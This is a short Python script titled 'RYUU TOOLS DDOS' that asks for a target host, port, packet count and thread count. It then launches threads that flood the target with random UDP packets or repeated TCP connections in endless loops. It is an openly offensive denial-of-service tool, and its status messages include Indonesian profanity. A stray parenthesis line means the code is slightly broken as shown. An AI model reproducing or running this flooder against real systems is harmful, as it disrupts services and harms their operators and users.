import random
import socket
import threading
import os

os.system("clear")
print("""RYUU TOOLS DDOS
""")

print       (" - - > TOOLS DDOS RYUU < - - ")
)


ip = str(input("  HOST/IP:"))
port = int(input(" Port:"))
choice = str(input(" Ddos?(y/n):"))
times = int(input(" Packets :"))
threads = int(input(" Threads :"))
os.system("clear")
def run():
	data = random._urandom(1800)
	i = random.choice(("[+]","[-]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			addr = (str(ip),int(port))
			for x in range(times):
				s.sendto(data,addr)
			print(i +" MENGOCOK IP IP%s DAN MENGENTOD PORT%s"%(ip,port))
		except:
			print("[!] AWAS DOWN")

def run2():
	data = random._urandom(18)
	i = random.choice(("[*]","[!]","[#]"))
	while True:
		try:
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((ip,port))
			s.send(data)
			for x in range(times):
				s.send(data)
			print(i +" MENGOCOK IP IP%s DAN MENGENTOD PORT%s"%(ip,port))
		except:
			s.close()
			print("[*] AWAS DOWN")
            
for y in range(threads):
	if choice == 'y':
		th = threading.Thread(target = run)
		th.start()
	else:
		th = threading.Thread(target = run2)
		th.start()